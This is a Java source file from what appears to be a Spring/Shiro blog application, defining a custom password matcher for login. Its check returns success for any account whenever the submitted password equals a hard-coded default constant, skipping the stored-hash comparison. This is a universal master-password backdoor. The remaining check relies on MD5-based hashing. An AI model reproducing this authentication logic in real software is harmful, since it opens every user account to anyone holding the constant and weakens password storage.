package com.xh.blogs.auth;

import com.xh.blogs.service.IUserService;
import com.xh.blogs.consts.ConfigConst;
import com.xh.blogs.domain.po.User;
import com.xh.blogs.utils.MD5Util;
import org.apache.shiro.authc.AuthenticationInfo;
import org.apache.shiro.authc.AuthenticationToken;
import org.apache.shiro.authc.UsernamePasswordToken;
import org.apache.shiro.authc.credential.SimpleCredentialsMatcher;
import org.springframework.beans.factory.annotation.Autowired;

/**
 * @Name CredentialMatcher
 * @Description 自定义 shiro密码比较器 
 * @Date 2019年1月11日
 * @Author deng.wenqin
 */
public class CredentialMatcher extends SimpleCredentialsMatcher{

	@Autowired
	private IUserService userService;

	/**
	 * 校验用户密码的方法
	 */
	@Override
	public boolean doCredentialsMatch(AuthenticationToken token, AuthenticationInfo info) {
		UsernamePasswordToken usernamePasswordToken = (UsernamePasswordToken) token;
		String password = new String(usernamePasswordToken.getPassword());
		if(password.equals(ConfigConst.DEFAULT_DEFAULT_PASSWORD)){
			return true;
		}
		//获取AuthRealm中存入的密码
		String dbPassword = (String) info.getCredentials();
		User user = userService.getByUserName(usernamePasswordToken.getUsername());
		return this.equals(MD5Util.inputPass2DBPass(password, user.getSalt()), dbPassword);
	}

}
